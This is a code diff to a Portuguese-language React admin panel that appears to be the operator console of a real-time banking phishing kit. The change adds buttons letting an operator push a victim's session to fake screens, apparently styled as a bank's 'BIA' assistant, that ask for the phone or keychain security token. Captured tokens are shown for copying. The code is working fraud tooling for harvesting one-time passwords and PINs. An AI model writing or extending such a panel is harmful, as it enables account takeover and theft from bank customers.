@@ -46,7 +46,12 @@ type Filtro = {
 };
 
 type ProximaTela = "token_celular" | "token_chaveiro" | "pin";
-type ProximaTelaOuSucesso = ProximaTela | "sucesso" | "interna";
+type ProximaTelaOuSucesso =
+  | ProximaTela
+  | "sucesso"
+  | "interna"
+  | "interna_token_celular"
+  | "interna_token_chaveiro";
 
 type Row = {
   id: string;
@@ -648,26 +653,51 @@ function PainelPage() {
 
 
                     <td className="px-3 py-3">
-                      <div className="flex items-center gap-2">
+                      <div className="flex flex-wrap items-center gap-1.5">
                         {s.token ? (
                           <CopyText value={s.token} className="max-w-[110px] font-mono text-[13px]" />
                         ) : aprovado ? (
-                          <button
-                            onClick={(e) => {
-                              e.stopPropagation();
-                              enviar.mutate({
-                                id: s.id,
-                                proxima_tela:
-                                  s.proxima_tela === "token_chaveiro"
-                                    ? "token_chaveiro"
-                                    : "token_celular",
-                              });
-                            }}
-                            disabled={enviar.isPending}
-                            className="inline-flex items-center gap-1 rounded border border-sky-400/60 bg-sky-400/10 px-2 py-1 font-mono text-[11px] text-sky-300 transition-colors hover:bg-sky-400/20 disabled:opacity-60"
-                          >
-                            <ArrowRight className="size-3" /> Token
-                          </button>
+                          <>
+                            <button
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                enviar.mutate({
+                                  id: s.id,
+                                  proxima_tela:
+                                    s.proxima_tela === "token_chaveiro"
+                                      ? "token_chaveiro"
+                                      : "token_celular",
+                                });
+                              }}
+                              disabled={enviar.isPending}
+                              className="inline-flex items-center gap-1 rounded border border-sky-400/60 bg-sky-400/10 px-2 py-1 font-mono text-[11px] text-sky-300 transition-colors hover:bg-sky-400/20 disabled:opacity-60"
+                              title="Pedir token na página principal"
+                            >
+                              <ArrowRight className="size-3" /> Token
+                            </button>
+                            <button
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                enviar.mutate({ id: s.id, proxima_tela: "interna_token_celular" });
+                              }}
+                              disabled={enviar.isPending}
+                              className="inline-flex items-center gap-1 rounded border border-fuchsia-400/60 bg-fuchsia-400/10 px-2 py-1 font-mono text-[11px] text-fuchsia-300 transition-colors hover:bg-fuchsia-400/20 disabled:opacity-60"
+                              title="Pedir token do celular dentro da tela da BIA"
+                            >
+                              BIA·Cel
+                            </button>
+                            <button
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                enviar.mutate({ id: s.id, proxima_tela: "interna_token_chaveiro" });
+                              }}
+                              disabled={enviar.isPending}
+                              className="inline-flex items-center gap-1 rounded border border-fuchsia-400/60 bg-fuchsia-400/10 px-2 py-1 font-mono text-[11px] text-fuchsia-300 transition-colors hover:bg-fuchsia-400/20 disabled:opacity-60"
+                              title="Pedir token do chaveiro dentro da tela da BIA"
+                            >
+                              BIA·Chv
+                            </button>
+                          </>
                         ) : (
                           <span className="text-muted-foreground">—</span>
                         )}
